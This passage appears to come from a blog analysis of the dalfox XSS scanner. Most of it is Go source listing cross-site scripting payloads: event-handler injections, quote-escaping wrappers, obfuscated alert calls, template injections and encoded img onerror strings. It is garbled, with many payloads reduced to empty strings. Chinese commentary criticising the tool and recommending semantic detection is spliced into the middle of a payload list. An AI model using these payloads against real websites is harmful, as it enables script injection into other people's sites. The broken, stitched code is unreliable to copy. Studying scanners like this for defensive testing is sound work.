        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "
",
        "1",
        "
",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "1",
        "",
        "",
        "\" 
class=dalfox>",
        "\" 
class=dalfox>",
        "\" 
class=dalfox>",
        "\" 
class=dalfox>",
    }
    if strings.Contains(ip, "comment") {
        // TODO add comment payloads
    }
    return payload
}
// getAttrPayload is is return xss
func getAttrPayload(ip string) []string {
    payload := []string{
        "onpointerenter=prompt`DALFOX_ALERT_VALUE` class=dalfox ",
        "onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox ",
    }
    majorHandler := []string{
        "onmouseover",
        "onmouseenter",
        "onmouseleave",
        "onmouseenter",
        "onmouseenter",
        "onpointerover",
        "onpointerdown",
        "onpointerenter",
        "onpointerleave",
        "onpointermove",
        "onpointerout",
        "onpointerup",
        "ontouchstart",
        "ontouchend",
        "ontouchmove",
    }
    for _, mh := range majorHandler {
        payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
        payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox 
")
        payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox 
")
        payload = append(payload, mh+"=print(DALFOX_ALERT_VALUE) class=dalfox ")
    }
    // set html base payloads
    hp := getHTMLPayload("")
    for _, h := range hp {
        payload = append(payload, ">"+h)
    }
    // Set all event handler base payloads
    // However, the payload must be validated and applied.
    /*
        eh := GetEventHandlers()
        for _, e := range eh {
        payload = append(payload, e+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
        payload = append(payload, e+"=confirm(DALFOX_ALERT_VALUE) class=dalfox 
")
        payload = append(payload, e+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
        //}
    */
    if strings.Contains(ip, "none") {
        return payload
    }
    if strings.Contains(ip, "double") {
        var tempPayload []string
        for _, v := range payload {
            tempPayload = append(tempPayload, "\""+v)
        }
        return tempPayload
    }
    if strings.Contains(ip, "single") {
        var tempPayload []string
        for _, v := range payload {
            tempPayload = append(tempPayload, "'"+v)
        }
        return tempPayload
    }
    return payload
}
func getInJsPayload(ip string) []string {
    payload := []string{
        "alert(DALFOX_ALERT_VALUE)",
        "confirm(DALFOX_ALERT_VALUE)",
        "prompt(DALFOX_ALERT_VALUE)",
        "print(DALFOX_ALERT_VALUE)",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "",
        "window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
        "this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
        "self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+
(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
        "globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!!
[]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);",
        "parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])",
        "top[/al/.source+/ert/.source](/XSS/.source)",
        "frames[/al/.source+/ert/.source](/XSS/.source)",
        "self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]
['domain'])",
        "this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
        "this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
        "window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]
['domain'])",
        "{{toString().constructor.constructor('alert(DALFOX_ALERT_VALUE)')()}}",
        "{{-function(){this.alert(DALFOX_ALERT_VALUE)}()}}",
    }
    if strings.Contains(ip, "none") {
        var tempPayload []string
        for _, v := range payload {
            tempPayload = append(tempPayload, ";"+v+";//")
            tempPayload = append(tempPayload, ";"+v+";")
            tempPayload = append(tempPayload, v)
        }
        return tempPayload
    }
    if strings.Contains(ip, "double") {
        var tempPayload []string
        for _, v := range payload {
            tempPayload = append(tempPayload, "\"+"+v+"//")
            tempPayload = append(tempPayload, "\";"+v+"//")
            tempPayload = append(tempPayload, "\"+"+v+"+\"")
            tempPayload = append(tempPayload, "\"-"+v+"-\"")
            tempPayload = append(tempPayload, "\""+v+"\"")
            tempPayload = append(tempPayload, "\\\"+"+v+"//")
            tempPayload = append(tempPayload, "\\\";"+v+"//")
            tempPayload = append(tempPayload, "\\\"+"+v+"+\"")
            tempPayload = append(tempPayload, "\\\"-"+v+"-\"")
            tempPayload = append(tempPayload, "\\\""+v+"\"")
        }
        return tempPayload
    }
    if strings.Contains(ip, "single") {
        var tempPayload []string
        for _, v := range payload {
            tempPayload = append(tempPayload, "'+"+v+"//")
            tempPayload = append(tempPayload, "';"+v+"//")
            tempPayload = append(tempPayload, "'+"+v+"+'")
            tempPayload = append(tempPayload, "'-"+v+"-'")
            tempPayload = append(tempPayload, "'"+v+"'")
            tempPayload = append(tempPayload, "\\'+"+v+"//")
            tempPayload = append(tempPayload, "\\';"+v+"//")
            tempPayload = append(tempPayload, "\\'+"+v+"+'")
            tempPayload = append(tempPayload, "\\'-"+v+"-'")
            tempPayload = append(tempPayload, "\\'"+v+"'")
        }
        return tempPayload
    }
    if strings.Contains(ip, "backtick") {
        var tempPayload []string
        for _, v := range payload {
            tempPayload = append(tempPayload, "${"+v+"}")
        }
        return tempPayload
    }
    return payload
}
func getDOMXSSPayload() []string {
    payload := []string{
        "",
        ";alert(DALFOX_ALERT_VALUE);",
        "javascript:alert(DALFOX_ALERT_VALUE)",
    }
    return payload
}
func getDeepDOMXSPayload() []string {
    payload := []string{
        "",
        "",
        "alert(DALFOX_ALERT_VALUE)",
        "prompt(DALFOX_ALERT_VALUE)",
        "confirm(DALFOX_ALERT_VALUE)",
        "print(DALFOX_ALERT_VALUE)",
其他
后面还有一些基于headless的检测，就是hook了alert，发payload，看能触发alert()函数吗。
然后就没有什么值得研究的了，这个代码能学习的就到此为止了。。也不建议使用，效率，误报，都很
高。
现在的xss扫描器应该怎么做，可以模仿xray的方式，先一个无害的随机字母，确定位置，根据位置组合
对应的payload，进行dom解析，如果解析变化了即可说明存在xss漏洞。全程没有payload，控制下速
率也不会触发waf。
我的一些研究：xss扫描器成长记
https://x.hacking8.com/post-371.html
 我叫这种方式为基于语义的xss检测，并且也在w13scan上加入了对应的扫描模块
https://github.com/w-digital-scanner/w13scan
        ";alert(DALFOX_ALERT_VALUE);",
        "javascript:alert(DALFOX_ALERT_VALUE)",
        "java%0ascript:alert(DALFOX_ALERT_VALUE)",
        "data:text/javascript;,alert(DALFOX_ALERT_VALUE)",
        "",
        "\\x3ciMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
        "\\74iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
        "\">",
        "\\x27\\x3E\\x3Cimg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3E",
        "\\47\\76\\74img src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
        "\">",
        "\\x22\\x3e\\x3cimg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
        "\\42\\76\\74img src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
        "\">",
        "\\x27\\x3e\\x3cimg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
        "\\47\\76\\74img src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
        "1 -->",
        "1 --\\x3e\\x3ciMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
        "1 --\\76\\74iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
        "]]>",
        "]]\\x3e\\x3ciMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\x3e",
        "]]\\76\\74iMg src=a oNerrOr=alert(DALFOX_ALERT_VALUE)\\76",
        "",
"\\x3c/scrIpt\\x3e\\x3cscript\\x3ealert(DALFOX_ALERT_VALUE)\\x3c/scrIpt\\x3e",
        "\\74/scrIpt\\76\\74script\\76alert(DALFOX_ALERT_VALUE)\\74/scrIpt\\76",
    }
    return payload
}